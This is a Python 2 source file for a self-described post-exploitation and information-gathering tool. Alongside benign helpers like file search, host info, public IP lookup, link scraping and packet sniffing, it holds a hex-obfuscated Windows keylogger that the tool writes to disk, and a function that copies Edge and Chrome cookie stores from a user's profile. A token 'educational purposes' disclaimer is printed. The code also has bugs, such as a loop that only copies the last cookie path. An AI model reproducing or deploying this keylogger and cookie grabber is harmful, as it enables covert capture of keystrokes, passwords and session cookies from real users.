import os
import re
from argparse import *
import platform
import requests
from tqdm import tqdm
from shutil import copy
from scapy.all import *
from bs4 import BeautifulSoup


def arguments():
    '''Program Usage.
    Returns arguments being passed in.'''
    parser = ArgumentParser(description='Info Gather/Post Exploitation Tool')
    parser.add_argument('-s', '--search', help='search file')
    parser.add_argument('-p', '--path', help='specify file path')
    parser.add_argument('-sD', '--system', help='obtains system info', action='store_true')
    parser.add_argument('-pI', '--public_ip', help='gets current public ipv4 address', action='store_true')
    parser.add_argument('-g', '--genklogger', help='generates a keylogger', action='store_true')
    parser.add_argument('-sR', '--scrape', help='scrapes links from a page')
    parser.add_argument('-c', '--cookies', help='grabs locally stored cookies', action='store_true')
    parser.add_argument('-S', '--sniff', help='sniff packets', action='store_true')
    parser.add_argument('-i', '--interface', help='specify NIC')
    args = parser.parse_args()
    search_string = args.search
    path_string = args.path
    system_details = args.system
    pub_ip = args.public_ip
    keylogger_script = args.genklogger
    scrapper = args.scrape
    grab_cookies = args.cookies
    interface = args.interface
    sniff = args.sniff
    return (search_string, path_string, system_details, pub_ip,
            keylogger_script, scrapper, grab_cookies, interface, sniff)


def search_file(filename_arg, path_arg):
    '''loops the selected drive's files and
        searches for a particular string.'''
    print '[+]Searching..'
    for path, directories, files in os.walk(path_arg):
        for directory in directories:
            continue
        for file in files:
            if filename_arg in file.lower():
                print os.path.join(path, directory, file)
    print '-' * 60
    print '[+]Files Found'


def system_detection():
    '''Attempts To Find System Hardware, Hostname and Operating System.'''
    print '[+]Host Information'
    print '-' * 60
    print '[+]Platform:', platform.platform()
    print '[+]Architecture:', platform.architecture()[0]
    print '[+]Hostname:', platform.node()
    print '[+]Processor:', platform.processor()
    print '-' * 60


def get_ipv4():
    '''Fetches Website Content, and grabs the ip'''
    url = 'http://checkip.dyndns.org'
    print '[+]Fetching Public IP Address Using', url
    request = requests.get(url)
    ip = re.findall("\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", request.text)
    print '[+]Current Public Ip: {}'.format(ip[0])


def generate_keylogger():
    '''Generates keylogger script'''
    source = "\x69\x6d\x70\x6f\x72\x74\x20\x70\x79\x48\x6f\x6f\x6b\x0d\x0a"
    source += "\x0d\x0a\x69\x6d\x70\x6f\x72\x74\x20\x70\x79\x74\x68\x6f\x6e"
    source += "\x63\x6f\x6d\x0d\x0a\x0d\x0a\x69\x6d\x70\x6f\x72\x74\x20\x6c"
    source += "\x6f\x67\x67\x69\x6e\x67\x0d\x0a\x0d\x0a\x69\x6d\x70\x6f\x72"
    source += "\x74\x20\x6f\x73\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d\x0a\x0d"
    source += "\x0a\x63\x6c\x61\x73\x73\x20\x4b\x65\x79\x6c\x6f\x67\x67\x65"
    source += "\x72\x3a\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x64\x65\x66\x20\x5f"
    source += "\x5f\x69\x6e\x69\x74\x5f\x5f\x28\x73\x65\x6c\x66\x29\x3a\x0d"
    source += "\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6c\x66"
    source += "\x2e\x74\x65\x78\x74\x6c\x6f\x67\x20\x3d\x20\x6f\x73\x2e\x67"
    source += "\x65\x74\x63\x77\x64\x28\x29\x0d\x0a\x0d\x0a\x20\x20\x20\x20"
    source += "\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x74\x65\x68\x68\x6f\x6f"
    source += "\x6b\x20\x3d\x20\x70\x79\x48\x6f\x6f\x6b\x2e\x48\x6f\x6f\x6b"
    source += "\x4d\x61\x6e\x61\x67\x65\x72\x28\x29\x0d\x0a\x0d\x0a\x20\x20"
    source += "\x20\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x74\x65\x68\x68"
    source += "\x6f\x6f\x6b\x2e\x4b\x65\x79\x44\x6f\x77\x6e\x20\x3d\x20\x73"
    source += "\x65\x6c\x66\x2e\x67\x65\x74\x6b\x65\x79\x73\x0d\x0a\x0d\x0a"
    source += "\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x74\x65"
    source += "\x68\x68\x6f\x6f\x6b\x2e\x48\x6f\x6f\x6b\x4b\x65\x79\x62\x6f"
    source += "\x61\x72\x64\x28\x29\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20"
    source += "\x20\x20\x70\x79\x74\x68\x6f\x6e\x63\x6f\x6d\x2e\x50\x75\x6d"
    source += "\x70\x4d\x65\x73\x73\x61\x67\x65\x73\x28\x29\x0d\x0a\x0d\x0a"
    source += "\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x64\x65\x66\x20\x67\x65\x74"
    source += "\x6b\x65\x79\x73\x28\x73\x65\x6c\x66\x2c\x20\x6b\x65\x79\x29"
    source += "\x3a\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x6c\x6f"
    source += "\x67\x67\x69\x6e\x67\x2e\x62\x61\x73\x69\x63\x43\x6f\x6e\x66"
    source += "\x69\x67\x28\x66\x69\x6c\x65\x6e\x61\x6d\x65\x3d\x73\x65\x6c"
    source += "\x66\x2e\x74\x65\x78\x74\x6c\x6f\x67\x2c\x20\x6c\x65\x76\x65"
    source += "\x6c\x3d\x6c\x6f\x67\x67\x69\x6e\x67\x2e\x44\x45\x42\x55\x47"
    source += "\x2c\x20\x66\x6f\x72\x6d\x61\x74\x3d\x27\x25\x28\x6d\x65\x73"
    source += "\x73\x61\x67\x65\x29\x73\x27\x29\x0d\x0a\x0d\x0a\x20\x20\x20"
    source += "\x20\x20\x20\x20\x20\x63\x68\x72\x28\x6b\x65\x79\x2e\x41\x73"
    source += "\x63\x69\x69\x29\x2c\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20"
    source += "\x20\x20\x6c\x6f\x67\x67\x69\x6e\x67\x2e\x6c\x6f\x67\x28\x31"
    source += "\x30\x2c\x20\x63\x68\x72\x28\x6b\x65\x79\x2e\x41\x73\x63\x69"
    source += "\x69\x29\x29\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20"
    source += "\x70\x72\x69\x6e\x74\x20\x63\x68\x72\x28\x6b\x65\x79\x2e\x41"
    source += "\x73\x63\x69\x69\x29\x2c\x0d\x0a\x0d\x0a\x20\x20\x20\x20\x20"
    source += "\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x54\x72\x75\x65\x0d"
    source += "\x0a\x0d\x0a\x6b\x65\x79\x6c\x6f\x67\x67\x65\x72\x20\x3d\x20"
    source += "\x4b\x65\x79\x6c\x6f\x67\x67\x65\x72\x28\x29"
    print '[+]DISCLAIMER: used for testing and educational purposes only.'
    print '[+]Use at your own risk.'
    print '[+]You must use your own software to convert to exe'
    print '[+]Windows compatible only'
    print '[+]Saved at', os.getcwd()
    with open('keylogger.py', 'w') as code:
        code.write(source)
        code.close()


def scrape_all_links(scrape_all_links_arg):
    '''fetches a specific page and searches for every link'''
    print '[+]Fetching links from', scrape_all_links_arg
    print '-' * 60
    page = requests.get("http://{}/".format(scrape_all_links_arg))
    content = page.text
    parser = BeautifulSoup(content, 'html.parser')
    for link in tqdm(parser.findAll('a')):
        print link.get('href')
    print '-' * 60
    print '[+]Links Found'


def grab_local_cookies():
    '''fetches locally stored cookies'''
    current_user = os.environ.get('USERNAME')
    common_browser_cookie_file_paths = ['C:\users\{}\AppData\Local\MicrosoftEdge\Cookies'.format(current_user),
                                        'C:\users\{}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\INetCookies'.format(current_user),
                                        'C:\users\{}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\MicrosoftEdge\Cookies'.format(current_user),
                                        'C:\users\{}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!001\INetCookies'.format(current_user),
                                        'C:\users\{}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!001\MicrosoftEdge\Cookies'.format(current_user),
                                        'C:\users\{}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!001\MicrosoftEdge\User\Default\DOMStore'.format(current_user),
                                        'C:\users\{}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!002\INetCookies'.format(current_user),
                                        'C:\users\{}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!002\MicrosoftEdge\Cookies'.format(current_user),
                                        'C:\users\{}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\#!002\MicrosoftEdge\User\Default\DOMStore'.format(current_user),
                                        'C:\users\{}\AppData\Local\Google\Chrome\User Data\Default\Cookies'.format(current_user),
                                        'C:\Users\{}\AppData\Local\Microsoft\Windows\INetCookies'.format(current_user)]
    print '[+]Grabbing Cookies.'
    cookiejar = os.path.join(os.getcwd(), 'cookiejar')
    if not os.path.exists(cookiejar):
        os.mkdir('cookiejar')
    for paths in common_browser_cookie_file_paths:
        continue
    for file in tqdm(os.listdir(paths)):
        try:
            copy(os.path.join(paths, file), cookiejar)
        except Exception as e:
            pass
    print '[+]Saved In Current Directory.'


def sniff_packets(interface_arg):
    '''packet sniffer'''
    sniffer = sniff(iface=interface_arg, prn=lambda packet: packet.summary())
    print sniffer


def main():
    '''Main Function, matches arguments with
        the appropiate function to be called.'''
    (search_string, path_string, system_details, pub_ip, keylogger_script,
        scrapper, grab_cookies, interface, sniff) = arguments()
    if search_string and path_string:
        search_file(search_string, path_string)
    if sniff and interface:
        sniff_packets(interface)
    if system_details:
        system_detection()
    if pub_ip:
        get_ipv4()
    if keylogger_script:
        generate_keylogger()
    if scrapper:
        scrape_all_links(scrapper)
    if grab_cookies:
        grab_local_cookies()

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print e
